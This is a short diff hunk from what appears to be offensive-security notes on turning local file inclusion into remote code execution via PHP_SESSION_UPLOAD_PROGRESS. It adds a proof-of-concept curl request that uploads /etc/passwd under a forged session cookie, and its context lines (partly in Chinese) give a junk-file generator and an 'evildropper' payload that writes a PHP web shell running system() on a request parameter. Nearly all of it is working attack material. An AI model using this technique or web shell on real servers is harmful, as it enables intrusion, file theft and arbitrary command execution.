@@ -191,6 +191,8 @@ LFI to RCE
 
 PHP_SESSION_UPLOAD_PROGRESS
 ---
+    > POC
+    curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah' -F 'file=@/etc/passwd'
     創建一個塞滿垃圾的檔案和要塞進去tmp的shell
     python -c 'print "A" * 2048 * 1024' >> junk.txt
     evildropper:<?php file_put_contents('/tmp/shell.php','<?php system($_GET[3])?>'); ?>
